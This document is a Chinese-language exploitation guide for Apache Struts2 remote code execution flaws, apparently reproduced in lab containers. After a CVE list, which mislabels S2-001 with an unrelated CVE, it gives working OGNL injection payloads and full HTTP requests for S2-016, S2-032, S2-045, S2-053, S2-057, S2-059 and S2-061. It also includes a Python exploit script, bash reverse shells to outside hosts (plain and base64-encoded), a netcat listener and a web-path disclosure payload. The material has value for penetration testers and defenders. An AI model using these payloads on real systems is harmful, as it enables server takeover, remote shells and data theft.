Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。

历史漏洞
截止到20211011
Default
S2-001 远程代码执行漏洞 （CVE-2015-5254）
S2-005 远程代码执行漏洞  CVE-2010-1870 影响版本 2.0.0 - 2.1.8.1
S2-007 远程代码执行漏洞 影响版本: 2.0.0 - 2.2.3
S2-008 远程代码执行漏洞  CVE-2012-0391 影响版本:2.1.0 - 2.3.1
S2-009 远程代码执行漏洞  CVE-2011-3923 影响版本: 2.1.0 - 2.3.1.1
S2-012 远程代码执行漏洞  CVE-2013-1965 影响版本: 2.1.0 - 2.3.13
S2-013/S2-014 远程代码执行漏洞 CVE-2013-1966 影响版本: 2.0.0 - 2.3.14.1
S2-015 远程代码执行漏洞 CVE-2013-2134 CVE-2013-2135 影响版本: 2.0.0 - 2.3.14.2
S2-016 远程代码执行漏洞 CVE-2013-2251 影响版本: 2.0.0 - 2.3.15
S2-032 远程代码执行漏洞（CVE-2016-3081） 影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)
S2-045 远程代码执行漏洞（CVE-2017-5638） 影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
S2-046 Remote Code Execution Vulnerablity（CVE-2017-5638） 影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
S2-048 远程代码执行漏洞 CVE-2017-9791 影响版本: 2.0.0 - 2.3.32
S2-052 远程代码执行漏洞 影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
S2-053 远程代码执行漏洞 影响版本: Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10
S2-057 远程代码执行漏洞(CVE-2018-11776) Affected Version: <= Struts 2.3.34, Struts 2.5.16
S2-059 远程代码执行漏洞(CVE-2019-0230) 影响版本: Struts 2.0.0 - Struts 2.5.20
S2-061 远程命令执行漏洞（CVE-2020-17530）该漏洞影响版本范围是Struts 2.0.0到Struts 2.5.25。

S2-061 远程代码执行漏洞

S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式是加强OGNL表达式沙盒，而S2-061绕过了该沙盒。该漏洞影响版本范围是Struts 2.0.0到Struts 2.5.25。

进入到首页，发现如下数据包，即可执行id命令：
Default
POST /index.action HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 829
 
------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"
 
%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
payload
Default
bash -i >& /dev/tcp/1.1.1.1/4444 0>&1

在 Base64 编码的帮助下，下面的转换器可以帮助减少这些问题。它可以通过调用 Bash 或 PowerShell 再次使管道和重定向变得更好，并且还确保参数中没有空格。
http://www.jackson-t.ca/runtime-exec-payloads.html
Default
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE4Mi4xMzQvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}

将上面命令放入到要执行命令的括号里面。
反弹shell请求
Default
POST /index.action HTTP/1.1
Host: 192.168.182.145:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 922
 
------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"
 
%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE4Mi4xMzQvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--

然后再攻击者服务器kali上
nc -lvvp 4444

S2-059 远程代码执行漏洞(CVE-2019-0230)

影响版本: Struts 2.0.0 – Struts 2.5.20
访问 http://ip:8080/?id=%25%7B233*233%7D，可以发现233*233的结果被解析到了id属性中：

通过如下Python脚本复现漏洞：
Default
import requests
 
url = "http://127.0.0.1:8080"
data1 = {
    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
}
data2 = {
    "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}"
}
res1 = requests.post(url, data=data1)
# print(res1.text)
res2 = requests.post(url, data=data2)
# print(res2.text)

执行poc之后，进入容器
查看容器id：docker ps
进入docker：docker exec -it 7f8b773067b8 /bin/bash
发现touch /tmp/success已成功执行。

S2-057 远程命令执行漏洞（CVE-2018-11776)）

S2-057漏洞产生于网站配置xml的时候，有一个namespace的值，该值并没有做详细的安全过滤导致可以写入到xml上，尤其url标签值也没有做通配符的过滤，导致可以执行远程代码以及系统命令到服务器系统中去 。
影响版本：<= Struts 2.3.34, Struts 2.5.16

访问如下url：
Default
http://ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action

进行计算既存在漏洞
执行命令的poc
Default
${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
 
POC进行URL编码后插入到GET请求中即可远程命令执行

S2-053 远程代码执行漏洞（CVE-2017-12611）

Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。
影响版本: Struts 2.0.1 – Struts 2.3.33, Struts 2.5 – Struts 2.5.10

环境运行后，访问http://your-ip:8080/hello.action即可看到一个提交页面
输入如下Payload即可成功执行命令：
Default
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
反弹shell
Default
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/1.1.1.1/6666 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
 
上述Payload末尾的换行不能掉，payload后面必须跟一个换行

S2-048 远程命令执行漏洞（CVE-2017-9791）

影响版本: 2.0.0 – 2.3.32
访问：http://your-ip:8080/showcase/
触发OGNL表达式的位置是Gangster Name这个表单。
输入${233*233}即可查看执行结果（剩下两个表单随意填写）：

S2-045 远程代码执行漏洞（CVE-2017-5638）

影响版本: Struts 2.3.5 – Struts 2.3.31, Struts 2.5 – Struts 2.5.10
环境启动后，访问http://your-ip:8080即可看到上传页面。
直接发送如下数据包，233*233成功执行该漏洞就是存在
Default
POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Length: 0
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('test',233*233)}.multipart/form-data

S2-032 远程代码执行漏洞（CVE-2016-3081）

Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:<name>的方式来调用名字是<name>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞。
直接请求如下URL，即可执行id命令：
Default
http://your-ip:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id

S2-016 远程代码执行漏洞（CVE-2013-2251）

在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。
所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式。
执行命令：
Default
redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}
获取web目录：
Default
redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter (),#ot.print('web'),#ot.print('path:'),#ot.print(#req.getSession().getServletContext().getRealPath('/')),#ot.flush(),#ot.close()}
